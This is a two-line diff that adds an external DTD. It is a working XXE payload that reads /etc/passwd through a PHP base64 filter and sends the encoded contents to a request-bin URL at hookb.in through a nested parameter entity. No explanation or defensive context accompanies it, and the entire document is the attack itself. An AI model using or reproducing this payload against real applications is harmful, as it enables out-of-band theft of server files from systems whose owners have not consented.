@@ -1,0 +1,2 @@
+<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % int "<!ENTITY &#x25; trick SYSTEM 'http://hookb.in/wNMgoYmw6xCqJmrrJe3W/?%payl;'>">
